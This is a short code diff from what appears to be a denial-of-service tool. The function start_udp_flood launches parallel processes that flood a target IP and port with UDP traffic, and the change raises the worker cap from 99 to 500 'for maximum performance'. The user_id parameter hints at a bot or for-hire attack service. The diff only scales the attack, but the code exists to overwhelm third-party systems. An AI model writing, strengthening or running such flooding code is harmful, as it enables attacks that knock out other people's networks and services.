@@ -52,7 +52,7 @@ def start_udp_flood(user_id, target_ip, target_port):
     processes = []
 
     # Allow up to 500 CPU threads for maximum performance
-    for _ in range(min(99, multiprocessing.cpu_count())):
+    for _ in range(min(500, multiprocessing.cpu_count())):
         process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, stop_flag))
         process.start()
         processes.append(process)
